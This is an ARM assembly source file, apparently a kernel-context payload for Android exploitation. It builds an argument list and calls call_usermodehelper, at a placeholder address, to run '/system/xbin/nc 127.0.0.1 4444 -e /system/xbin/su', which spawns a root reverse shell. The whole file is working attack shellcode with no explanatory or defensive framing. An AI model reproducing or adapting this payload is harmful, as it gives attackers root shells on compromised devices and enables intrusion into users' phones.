.syntax unified
.global _start

.set call_usermodehelper, 0xdeadbe02
_start:

reverse_shell:
	push {r3, r4, r5, lr}
	mov r5, sp

/* setup env_path */
	mov r2, sp

	mov r3, pc
	b rs01
	.word 0
	.align 0
rs01:	
	push {r3}
	mov r3, pc
	b rs02
	.asciz "PATH=/sbin:/system/sbin:/system/bin:/system/xbin"
	.align 0
rs02:	
	push {r3}
	mov r3, pc
	b rs03
	.asciz "HOME=/"
	.align 0
rs03:	
	push {r3}

/* setup args */	
	mov r1, sp

	mov r3, pc
	b rs11
	.word 0
	.align 0
rs11:
	push {r3}
	mov r3, pc
	b rs12
	.asciz "&"
	.align 0
rs12:
	push {r3}
	mov r3, pc
	b rs13
	.asciz "/system/xbin/su"
	.align 0
rs13:
	push {r3}
	mov r3, pc
	b rs14
	.asciz "-e"
	.align 0
rs14:
	push {r3}
	mov r3, pc
	b rs15
	.asciz "4444"
	.align 0
rs15:
	push {r3}
	mov r3, pc
	b rs16
	.asciz "127.0.0.1"
	.align 0
rs16:
	push {r3}
	mov r3, pc
	b rs17
	.asciz 	"/system/xbin/nc"
	.align 0
rs17:
	push {r3}

/* setup nc_path */	
	mov r0, pc
	b rs21
	.asciz 	"/system/xbin/nc"
	.align 0
rs21:


	mov r3, #1

	ldr r4, =call_usermodehelper
	blx r4
	
	mov sp, r5
	pop {r3, r4, r5, pc}
